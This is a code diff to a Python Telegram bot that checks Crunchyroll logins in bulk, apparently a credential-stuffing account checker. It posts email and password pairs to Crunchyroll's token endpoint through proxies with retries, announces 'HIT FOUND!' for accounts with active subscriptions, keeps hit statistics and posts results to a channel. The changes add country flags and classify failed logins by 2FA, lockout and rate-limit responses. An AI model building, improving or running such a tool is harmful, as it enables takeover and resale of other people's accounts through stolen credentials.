@@ -14,6 +14,7 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import CallbackQueryHandler
 from supabase import create_client, Client
 from datetime import datetime, date, timedelta
+from regions import REGION_HINTS
 
 # ============= CONFIGURATION =============
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -523,6 +524,39 @@ Other modes (Netflix, etc.) coming soon...
 
 def format_single_result(result):
     """Returns nicely formatted HTML for single account check"""
+
+    # Get flag from your regions.py
+    country_code = result.get('country', 'ZZ').upper()
+    flag = REGION_HINTS.get(country_code, "🌍")
+
+    # Full country name mapping (common ones)
+    country_names = {
+        "BR": "Brazil",
+        "US": "United States",
+        "MX": "Mexico",
+        "CL": "Chile",
+        "FR": "France",
+        "DE": "Germany",
+        "IT": "Italy",
+        "ES": "Spain",
+        "GB": "United Kingdom",
+        "CA": "Canada",
+        "AU": "Australia",
+        "AR": "Argentina",
+        "CO": "Colombia",
+        "PE": "Peru",
+        "UY": "Uruguay",
+        "ZA": "South Africa",
+        "TR": "Turkey",
+        "NO": "Norway",
+        "NZ": "New Zealand",
+        "CR": "Costa Rica",
+        "ZZ": "Unknown",
+    }
+
+    country_name = country_names.get(country_code, country_code)
+    country_display = f"{country_name} {flag}"
+
     if result['success']:
         return f"""
 ✅ <b>HIT FOUND!</b>
@@ -539,7 +573,7 @@ def format_single_result(result):
 • Free Trial: {result['free_trial']}
 • Expiry: <b>{result['expiry'] or 'N/A'}</b>
 • Active: ✅ <b>{result['active']}</b>
-• Country: <b>{result['country']}</b>
+• Country: <b>{country_display}</b>
 
 ────────────────
 Channel: {CHANNEL_USERNAME}
@@ -550,13 +584,13 @@ Channel: {CHANNEL_USERNAME}
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 
-Status: {result['message']}
+📌 <b>Status:</b> {result['message']}
 
 Try another account!
         """.strip()
 
 def check_crunchyroll(email, password, proxy=None):
-    """Improved version with retry for better consistency"""
+    """Improved version with better error messages"""
     result = {
         'email': email,
         'password': password,
@@ -600,6 +634,21 @@ def check_crunchyroll(email, password, proxy=None):
             resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
             
             if resp.status_code != 200:
+                error_text = resp.text.lower()
+
+                if "two_factor" in error_text or "2fa" in error_text or "otp_required" in error_text or "verification_code" in error_text:
+                    result['message'] = "2FA / OTP Required"
+                elif "invalid_credentials" in error_text or "invalid username or password" in error_text:
+                    result['message'] = "Invalid email or password"
+                elif "account locked" in error_text or "locked" in error_text:
+                    result['message'] = "Account is locked"
+                elif resp.status_code == 429:
+                    result['message'] = "Too many attempts (rate limited)"
+                elif resp.status_code == 403:
+                    result['message'] = "Access forbidden"
+                else:
+                    result['message'] = f"Login failed (HTTP {resp.status_code})"
+
                 if attempt < max_retries:
                     time.sleep(1.5)
                     continue
@@ -660,7 +709,7 @@ def check_crunchyroll(email, password, proxy=None):
                 result['message'] = 'ACTIVE SUBSCRIPTION!'
             else:
                 result['success'] = False
-                result['message'] = 'No active subscription'
+                result['message'] = 'Valid account but no paid plan'
             
             return result   # Success on this attempt
             
@@ -822,7 +871,7 @@ async def handle_message(update: Update, context: CallbackContext):
             update_user_stats({
                 "total_scans": stats["total_scans"] + 1,
                 "total_hits": stats["total_hits"] + hits_increment,
-                "total_free": stats.get("total_free", 0) + bad_increment,   # ← Now tracks BAD
+                "total_free": stats.get("total_free", 0) + bad_increment,
                 "today_scans": stats["today_scans"] + 1
             })
             return
@@ -1091,7 +1140,6 @@ async def manage_result_pin(update: Update, context: CallbackContext, message_id
         context.user_data['last_pinned_result_id'] = message_id
     except Exception as e:
         print(f"⚠️ Failed to pin result: {e}")
-
 
 async def button_callback(update: Update, context: CallbackContext):
     query = update.callback_query
